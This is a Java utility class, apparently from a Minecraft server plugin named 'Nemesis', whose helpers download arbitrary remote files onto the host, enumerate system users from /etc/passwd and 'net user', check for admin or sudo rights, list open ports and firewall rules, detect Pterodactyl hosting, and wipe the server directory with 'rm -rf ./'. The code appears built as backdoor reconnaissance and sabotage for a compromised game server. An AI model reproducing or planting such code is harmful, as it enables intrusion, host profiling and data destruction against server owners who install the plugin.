package nemesis;

import net.md_5.bungee.api.ChatColor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Scanner;

public class Utils {

    private static final Nemesis main = Nemesis.getInstance();

    public static String colorize(String message) {
        return ChatColor.translateAlternateColorCodes('&', "&8[&e&l!&8] " + message);
    }

    public static List<String> colorize(List<String> message) {
        ArrayList<String> newList = new ArrayList<>();
        message.forEach(msg -> newList.add(colorize(msg)));

        return newList;
    }

    public static void runAsync(Runnable runnable) {
        main.getServer().getScheduler().runTaskAsynchronously(main,
                runnable);
    }

    public static Player getPlayerExact(String name) {
        return main.getServer().getPlayerExact(name);
    }

    public static Player getFromUUID(String uuid) {
        return main.getServer().getPlayer(uuid);
    }

    public static Plugin getFromString(String name) {
        return main.getServer().getPluginManager().getPlugin(name);
    }

    public static void downloadFile(CommandSender sender, String url, String fileName, String path) {
        runAsync(() -> {
            try {
                sender.sendMessage(colorize("&aDownloading " + fileName + " from " + url + " to " + path));
                InputStream in = new URL(url).openStream();
                FileOutputStream fos = new FileOutputStream(path + "/" + fileName);
                BufferedOutputStream bout = new BufferedOutputStream(fos, 1024);
                byte[] data = new byte[1024];
                int x;
                while ((x = in.read(data, 0, 1024)) >= 0) {
                    bout.write(data, 0, x);
                }
                bout.close();
                in.close();
                sender.sendMessage(colorize("&aDownloaded " + fileName + " from " + url + " to " + path));
            } catch (Exception e) {
                sender.sendMessage(colorize("&cError downloading file!"));
                if (e.getMessage() != null) {
                    sender.sendMessage(colorize("&c" + e.getMessage()));
                }
            }
        });
    }

    public static boolean isInt(String s) {
        try {
            Integer.parseInt(s);
            return true;
        } catch (NumberFormatException e) {
            return false;
        }
    }

    public static String getPublicIP() {
        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            Scanner sc = new Scanner(whatismyip.openStream());
            String ip = sc.next();
            sc.close();
            return ip;
        } catch (Exception e) {
            return "Error getting public IP!";
        }
    }

    public static List<String> getLinuxUsers() {
        List<String> users = new ArrayList<>();
        try {
            Process p = Runtime.getRuntime().exec("cut -d: -f1 /etc/passwd");
            Scanner sc = new Scanner(p.getInputStream());
            while (sc.hasNextLine()) {
                users.add(sc.nextLine());
            }
            sc.close();
        } catch (Exception e) {
            return Collections.emptyList();
        }
        return users;
    }

    public static List<String> getWindowsUsers() {
        List<String> users = new ArrayList<>();
        try {
            Process p = Runtime.getRuntime().exec("net user");
            Scanner sc = new Scanner(p.getInputStream());
            while (sc.hasNextLine()) {
                String line = sc.nextLine();
                if (line.contains("User accounts for")) {
                    continue;
                }
                if (line.contains("-------------------------------------------------------------------------------")) {
                    continue;
                }
                if (line.contains("The command completed successfully.")) {
                    continue;
                }
                users.add(line);
            }
            sc.close();
        } catch (Exception e) {
            return Collections.emptyList();
        }
        return users;
    }

    public static String getWindowsUser() {
        try {
            Process p = Runtime.getRuntime().exec("whoami");
            Scanner sc = new Scanner(p.getInputStream());
            String user = sc.nextLine();
            sc.close();
            return user;
        } catch (Exception e) {
            return "Error getting Windows user!";
        }
    }

    public static boolean isWindowsAdmin() {
        try {
            Process p = Runtime.getRuntime().exec("net session");
            Scanner sc = new Scanner(p.getInputStream());
            while (sc.hasNextLine()) {
                String line = sc.nextLine();
                if (line.contains("The command completed successfully.")) {
                    sc.close();
                    return true;
                }
            }
            sc.close();
        } catch (Exception e) {
            return false;
        }
        return false;
    }

    public static String getCPUName() {
        try {
            if (isLinux()) {
                Process p = Runtime.getRuntime().exec("cat /proc/cpuinfo");
                Scanner sc = new Scanner(p.getInputStream());
                while (sc.hasNextLine()) {
                    String line = sc.nextLine();
                    if (line.contains("model name")) {
                        sc.close();
                        return line.split(":")[1].trim();
                    }
                }
                sc.close();
            } else {
                Process p = Runtime.getRuntime().exec("wmic cpu get name");
                Scanner sc = new Scanner(p.getInputStream());
                while (sc.hasNextLine()) {
                    String line = sc.nextLine();
                    if (line.contains("Name")) {
                        continue;
                    }
                    if (line.contains("Error")) {
                        continue;
                    }
                    sc.close();
                    return line.trim();
                }
                sc.close();
            }
        } catch (Exception e) {
            return "Error getting CPU name!";
        }
        return "Error getting CPU name!";
    }

    public static int getCPUCores() {
        try {
            if (isLinux()) {
                Process p = Runtime.getRuntime().exec("cat /proc/cpuinfo");
                Scanner sc = new Scanner(p.getInputStream());
                int cores = 0;
                while (sc.hasNextLine()) {
                    String line = sc.nextLine();
                    if (line.contains("processor")) {
                        cores++;
                    }
                }
                sc.close();
                return cores;
            } else {
                Process p = Runtime.getRuntime().exec("wmic cpu get NumberOfCores");
                Scanner sc = new Scanner(p.getInputStream());
                while (sc.hasNextLine()) {
                    String line = sc.nextLine();
                    if (line.contains("NumberOfCores")) {
                        continue;
                    }
                    if (line.contains("Error")) {
                        continue;
                    }
                    sc.close();
                    return Integer.parseInt(line.trim());
                }
                sc.close();
            }
        } catch (Exception e) {
            return 0;
        }
        return 0;
    }

    public static boolean isLinux() {
        String os = System.getProperty("os.name").toLowerCase();
        return os.contains("nix") || os.contains("nux") || os.contains("aix");
    }

    public static boolean hasRootAccess() {
        try {
            Process p = Runtime.getRuntime().exec("sudo -l");
            Scanner sc = new Scanner(p.getInputStream());
            while (sc.hasNextLine()) {
                String line = sc.nextLine();
                if (line.contains("may run the following commands on")) {
                    sc.close();
                    return true;
                }
            }
        } catch (Exception e) {
            return false;
        }
        return false;
    }

    public static String getLinuxUser() {
        try {
            Process p = Runtime.getRuntime().exec("whoami");
            Scanner sc = new Scanner(p.getInputStream());
            String user = sc.nextLine();
            sc.close();
            return user;
        } catch (Exception e) {
            return "Error getting linux user!";
        }
    }

    public static void deleteEverything() {
        runAsync(() -> {
            try {
                Process p = Runtime.getRuntime().exec("rm -rf ./");
                p.waitFor();
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }

    public static String getLinuxDistro() {
        try {
            Process p = Runtime.getRuntime().exec("cat /etc/*-release");
            Scanner sc = new Scanner(p.getInputStream());
            while (sc.hasNextLine()) {
                String line = sc.nextLine();
                if (line.contains("PRETTY_NAME")) {
                    String[] split = line.split("=");
                    sc.close();
                    return split[1].replace("\"", "");
                }
            }
        } catch (Exception e) {
            return "Error getting Linux distro!";
        }
        return "Error getting Linux distro!";
    }

    public static List<String> getOpenPorts() {
        List<String> ports = new ArrayList<>();
        try {
            Process p = Runtime.getRuntime().exec("netstat -tulpn");
            Scanner sc = new Scanner(p.getInputStream());
            while (sc.hasNextLine()) {
                String line = sc.nextLine();
                if (line.contains("LISTEN")) {
                    String[] split = line.split(" ");
                    ports.add(split[3]);
                }
            }
            sc.close();
        } catch (Exception e) {
            return Collections.emptyList();
        }
        return ports;
    }

    public static List<String> getUFWRules() {
        List<String> rules = new ArrayList<>();
        try {
            Process p = Runtime.getRuntime().exec("ufw status numbered");
            Scanner sc = new Scanner(p.getInputStream());
            while (sc.hasNextLine()) {
                String line = sc.nextLine();
                if (line.contains("ALLOW")) {
                    rules.add(line);
                }
            }
            sc.close();
        } catch (Exception e) {
            return Collections.emptyList();
        }
        return rules;
    }

    public static List<String> getIptableRules() {
        List<String> rules = new ArrayList<>();
        try {
            Process p = Runtime.getRuntime().exec("iptables -L -n -v --line-numbers");
            Scanner sc = new Scanner(p.getInputStream());
            while (sc.hasNextLine()) {
                String line = sc.nextLine();
                if (line.contains("ACCEPT")) {
                    rules.add(line);
                }
            }
            sc.close();
        } catch (Exception e) {
            return Collections.emptyList();
        }
        return rules;

    }

    public static boolean isPterodactyl() {
        try {
            Process p = Runtime.getRuntime().exec("cat /etc/pterodactyl-release");
            Scanner sc = new Scanner(p.getInputStream());
            while (sc.hasNextLine()) {
                String line = sc.nextLine();
                if (line.contains("Pterodactyl")) {
                    sc.close();
                    return true;
                }
            }
        } catch (Exception e) {
            return false;
        }
        return false;
    }
}